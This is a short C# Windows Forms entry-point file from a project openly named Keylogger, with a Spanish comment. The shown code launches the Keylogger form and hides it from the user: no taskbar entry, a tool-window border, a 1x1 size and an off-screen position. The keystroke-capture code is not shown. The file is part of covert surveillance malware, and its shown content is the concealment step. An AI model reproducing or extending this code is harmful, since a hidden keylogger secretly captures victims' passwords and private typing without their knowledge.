using System;
using System.Windows.Forms;

namespace Keylogger
{
    static class Program
    {
        /// <summary>
        /// Punto de entrada principal para la aplicación.
        /// </summary>
        [STAThread]
        static void Main()
        {
            Form keylogger = new Keylogger();
            keylogger.FormBorderStyle = FormBorderStyle.FixedToolWindow;
            keylogger.ShowInTaskbar = false;
            keylogger.StartPosition = FormStartPosition.Manual;
            keylogger.Location = new System.Drawing.Point(-2000, -2000);
            keylogger.Size = new System.Drawing.Size(1, 1);
            Application.Run(keylogger);
        }
    }
}
